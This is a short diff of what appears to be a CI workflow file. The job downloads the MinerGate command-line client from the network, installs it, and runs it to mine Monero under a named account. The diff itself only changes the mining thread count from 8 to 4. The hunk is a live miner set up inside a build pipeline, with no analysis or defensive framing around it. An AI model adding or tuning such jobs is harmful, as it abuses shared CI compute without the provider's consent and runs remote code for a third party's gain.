@@ -13,4 +13,4 @@ jobs:
             sudo apt-get install libstdc++6 -yqq
             wget https://minergate.com/download/deb-cli -O minergate-cli.deb
             sudo dpkg -i minergate-cli.deb
-            minergate-cli --user yoginth@outlook.in --xmr 8
+            minergate-cli --user yoginth@outlook.in --xmr 4  
